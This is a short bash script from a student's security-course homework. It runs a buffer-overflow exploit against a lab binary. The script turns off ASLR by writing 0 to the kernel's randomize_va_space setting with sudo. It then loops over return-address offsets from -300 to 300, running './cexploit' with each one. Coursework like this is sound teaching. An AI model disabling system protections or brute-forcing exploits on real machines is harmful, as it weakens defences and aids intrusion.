#!/bin/bash

#Riad Shash (Ray)
#CSCI 420
#HW#5

echo "I'm going to disable ASLR..."
echo
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

#Try offsets from -300 to 300 for return address
for i in $(seq -300 1 300); do
    sleep 0.001
    echo Trying offset $i
    ./cexploit $i
done
